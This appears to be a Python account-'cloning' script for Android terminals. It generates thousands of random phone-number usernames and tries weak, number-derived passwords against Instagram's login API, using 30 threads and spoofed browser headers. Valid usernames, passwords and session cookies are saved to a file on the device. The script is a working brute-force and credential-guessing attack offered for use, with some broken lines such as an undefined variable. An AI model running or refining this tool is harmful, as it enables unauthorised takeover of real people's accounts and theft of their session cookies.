###-------[IMPORT MODULES]-----------####
 
import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime 
###-------[BASIC COLORS]-----------####
reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;37m"
 
###-------[FLASH COLORS]-----------####
colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
 
###-------[LOOP]-----------####
loop = 0
idz = []
oks = []
cps = []
 
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛instagram 🙂💗 \x07')
 
try:os.mkdir('/sdcard/XYZ')
except:pass
 
 
###-------[LOGO]-----------####
logo= f'''\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
\033[1;97m---------------------------------------------------'''
 
 
###-------[CLEAR TERMINAL]-----------####
def clear():
    os.system("clear")
    print(logo)
 
 
 
###-------[LINE]-----------####
def linex():
    print(f"\033[1;97m--------------------------------------------------")
 
 
 
###-------[MSIN MENU]-----------####
def menu():
    clear()
    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \033[1;32mCONTACT DEVELOPER")
    linex()
    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open ")
        time.sleep(3)
        menu()
    else:
        print(f"\n\033[1;91m Select valid option ....")
        time.sleep(3)
        menu()
 
 
###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f"\033[1;96m KING IS ALWAYS KING")
        print(f"\033[1;96m SOME RESPECT")
        linex()
        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
        linex()
        for xyz in idz:
            uid = code+xyz
            pww = ['57273200',uid[:6],uid[:8],uid] 
         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
            XYZ.submit(crack, uid, pww, total_idz)
    linex()
    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
    menu()
 
 
###-------[METHOD CRACK]-----------####
def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            cookies ={
                'csrftoken': csrftoken,
                'dpr': '2.200000047683716',
                'mid': 'ZsGH-gABAAHTlZHGc8pSZb05vOmE',
                'datr': '-ofBZsbspK-aBMjxtFXGrrZj',
                'ig_did': '4FCC0FDE-E73F-4507-BCBE-6F26A25A7DF9',
                'wd': '491x571',}
            data = {
                "enc_password": enc_password,
                'optIntoOneTap': 'false',
                'queryParams': '{"hl":"en"}',
                'trustedDeviceRecords': '{}',
                'username': uid,}
            headers = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"23076PC4BI"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"14.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'x-asbd-id': '129477',
                'x-csrftoken': csrftoken,
                'x-ig-app-id': '1217981644879628',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': '1015774379',
                'x-requested-with': 'XMLHttpRequest',
                'x-web-device-id': '4FCC0FDE-E73F-4507-BCBE-6F26A25A7DF9',}
            login_url = 'https://i.instagram.com/api/v1/web/accounts/login/ajax/'
            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
            session_cookies = response.cookies.get_dict()
            if response.status_code == 200:
                json_response = response.json()
                if json_response.get('status') == 'ok':
                   if json_response.get('authenticated') == True:
                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                        print(f"\r\033[1;92m [cookie] {cookies}")
                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                        oks.append(uid)
                        return True
                   elif json_response.get('auth_token'):
                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                        print(f"\r\033[1;92m [cookie] {cookies}")
                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                        oks.append(uid)
                        return True
                   elif 'sessionid' in session_cookies:
                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                        print(f"\r\033[1;92m [cookie] {cookies}")
                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                        oks.append(uid)
                        return True
            else:
                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass
menu()
 
